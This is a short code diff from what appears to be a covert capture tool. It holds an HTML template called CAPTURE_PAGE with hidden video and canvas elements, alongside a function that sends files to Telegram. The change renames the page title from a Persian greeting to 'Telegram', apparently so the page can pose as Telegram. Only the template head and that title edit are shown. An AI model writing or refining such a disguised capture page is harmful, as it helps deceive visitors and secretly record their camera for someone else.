@@ -68,7 +68,7 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False):
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>سلام و درود خدمت شما</title>
+<head><meta charset="UTF-8"><title>تلگرام</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
 </head>
 <body>
